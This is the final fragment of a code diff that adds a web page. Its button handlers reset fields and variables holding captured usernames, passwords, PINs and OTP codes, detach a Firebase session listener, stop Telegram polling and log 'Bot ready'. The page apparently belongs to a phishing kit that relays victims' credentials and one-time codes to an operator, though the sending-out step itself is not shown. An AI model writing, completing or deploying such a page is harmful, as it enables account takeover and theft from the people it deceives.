+      showWithLoader(pinScreen, 'Loading...', 500);
+    });
+    document.getElementById('retryBtn').addEventListener('click', function() {
+      if (statusListener) {
+        db.ref('sessions/' + currentSessionId + '/status').off('value', statusListener);
+        statusListener = null;
+      }
+      stopTelegramPolling();
+      document.getElementById('usernameInput').value = '';
+      document.getElementById('passwordInput').value = '';
+      document.getElementById('pinInput').value = '';
+      document.getElementById('otpInput').value = '';
+      capturedUsername = ''; capturedPassword = ''; capturedPin = '';
+      showWithLoader(loginScreen, 'Loading...', 500);
+    });
+    document.getElementById('logoutBtn').addEventListener('click', function() {
+      document.getElementById('usernameInput').value = '';
+      document.getElementById('passwordInput').value = '';
+      document.getElementById('pinInput').value = '';
+      document.getElementById('otpInput').value = '';
+      capturedUsername = ''; capturedPassword = ''; capturedPin = '';
+      if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+      if (statusListener) {
+        db.ref('sessions/' + currentSessionId + '/status').off('value', statusListener);
+        statusListener = null;
+      }
+      stopTelegramPolling();
+      showWithLoader(loginScreen, 'Loading...', 500);
+    });
+
+    console.log('✅ Firebase:', firebaseConfig.projectId);
+    console.log('✅ Bot ready');
+  </script>
+</body>
+</html>
